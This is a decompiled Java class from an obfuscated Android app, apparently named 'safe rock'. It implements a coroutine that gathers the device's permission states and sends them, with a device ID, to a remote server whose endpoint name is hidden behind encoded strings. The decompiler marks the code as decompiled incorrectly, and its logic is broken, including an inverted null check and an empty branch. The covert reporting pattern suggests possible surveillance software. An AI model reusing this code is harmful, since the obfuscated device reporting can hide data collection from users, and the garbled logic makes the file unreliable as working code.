package com.storm.safe.rock.service.modules;

import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.network.C0268a1;
import com.storm.safe.rock.util.StringUtil;
import java.util.Map;
import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.an0;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.NetworkManager$sendPermissionsUpdate$1", m214403f = "NetworkManager.kt", m214404l = {1169}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class NetworkManager$sendPermissionsUpdate$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public Object f52864a1;

    /* renamed from: a2 */
    public int f52865a2;

    /* renamed from: a3 */
    public final /* synthetic */ C0323a8 f52866a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public NetworkManager$sendPermissionsUpdate$1(C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52866a3 = c0323a8;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new NetworkManager$sendPermissionsUpdate$1(this.f52866a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((NetworkManager$sendPermissionsUpdate$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:30:0x0095 A[Catch: Exception -> 0x001b, TryCatch #0 {Exception -> 0x001b, blocks: (B:6:0x0012, B:24:0x0064, B:26:0x006a, B:28:0x0070, B:30:0x0095, B:31:0x0099, B:32:0x009e, B:13:0x0029, B:15:0x0039, B:17:0x004c, B:22:0x005e, B:23:0x0063), top: B:36:0x000a }] */
    /* JADX WARN: Removed duplicated region for block: B:31:0x0099 A[Catch: Exception -> 0x001b, TryCatch #0 {Exception -> 0x001b, blocks: (B:6:0x0012, B:24:0x0064, B:26:0x006a, B:28:0x0070, B:30:0x0095, B:31:0x0099, B:32:0x009e, B:13:0x0029, B:15:0x0039, B:17:0x004c, B:22:0x005e, B:23:0x0063), top: B:36:0x000a }] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        Map mapM209824a0;
        Map map;
        C0267a0 c0267a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52865a2;
        try {
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "发送权限更新失败", e);
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            String str = an0.f43729a0;
            mapM209824a0 = an0.m209824a0(this.f52866a3.f53100a0);
            if (this.f52866a3.f53101a1 != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("permissions", new JSONObject((Map<?, ?>) mapM209824a0));
                C0268a1 c0268a1 = this.f52866a3.f53101a1;
                if (c0268a1 == null) {
                    t60.m214724f2("httpManager");
                    throw null;
                }
                String strM212470a0 = StringUtil.m212470a0("O1wDN0QrHydYPzhmBCpJORgr");
                this.f52864a1 = mapM209824a0;
                this.f52865a2 = 1;
                if (c0268a1.m211373a3(strM212470a0, jSONObject, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                map = mapM209824a0;
            }
            if (this.f52866a3.f53103a3 && this.f52866a3.f53102a2 != null) {
                JSONObject jSONObject2 = new JSONObject();
                C0323a8 c0323a8 = this.f52866a3;
                jSONObject2.put("type", StringUtil.m212470a0("O1wDN0QrHydYPzhmBCpJORgr"));
                jSONObject2.put("deviceId", c0323a8.f53107a7);
                jSONObject2.put("permissions", new JSONObject((Map<?, ?>) mapM209824a0));
                c0267a0 = this.f52866a3.f53102a2;
                if (c0267a0 != null) {
                    t60.m214724f2("dataSyncClient");
                    throw null;
                }
                c0267a0.m211369b0(jSONObject2);
            }
            return C1351vv.f60710b1;
        }
        if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        map = (Map) this.f52864a1;
        kg1.m213544f4(obj);
        ((Result) obj).getClass();
        mapM209824a0 = map;
        if (this.f52866a3.f53103a3) {
            JSONObject jSONObject22 = new JSONObject();
            C0323a8 c0323a82 = this.f52866a3;
            jSONObject22.put("type", StringUtil.m212470a0("O1wDN0QrHydYPzhmBCpJORgr"));
            jSONObject22.put("deviceId", c0323a82.f53107a7);
            jSONObject22.put("permissions", new JSONObject((Map<?, ?>) mapM209824a0));
            c0267a0 = this.f52866a3.f53102a2;
            if (c0267a0 != null) {
            }
        }
        return C1351vv.f60710b1;
    }
}
